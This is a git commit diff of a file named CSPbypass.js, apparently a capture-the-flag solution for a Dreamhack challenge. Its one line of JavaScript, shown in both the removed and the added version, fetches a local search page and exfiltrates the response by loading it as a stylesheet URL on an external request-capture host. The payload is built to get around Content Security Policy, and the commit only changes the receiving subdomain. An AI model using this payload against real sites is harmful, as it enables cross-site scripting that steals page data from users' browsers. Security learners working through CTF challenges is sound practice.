db35901eca7193f7c921a16109e7eb8487039196
wornjss1002 <149930832+wornjss1002@users.noreply.github.com>
2025-10-26 21:55:21 +0900

    Update CSPbypass.js

--- CSPbypass.js
+++ CSPbypass.js
@@ -1,1 +1,1 @@
-fetch("http://127.0.0.1:12001/search?query=scpCTF").then(res=>res.text()).then(text=>{const l = document.createElement('link');l.rel='stylesheet';l.href='https://upyacox.request.dreamhack.games/?data='+ encodeURIComponent(text);document.head.appendChild(l);})
+fetch("http://127.0.0.1:12001/search?query=scpCTF").then(res=>res.text()).then(text=>{const l = document.createElement('link');l.rel='stylesheet';l.href='https://izrcdjz.request.dreamhack.games/?data='+ encodeURIComponent(text);document.head.appendChild(l);})
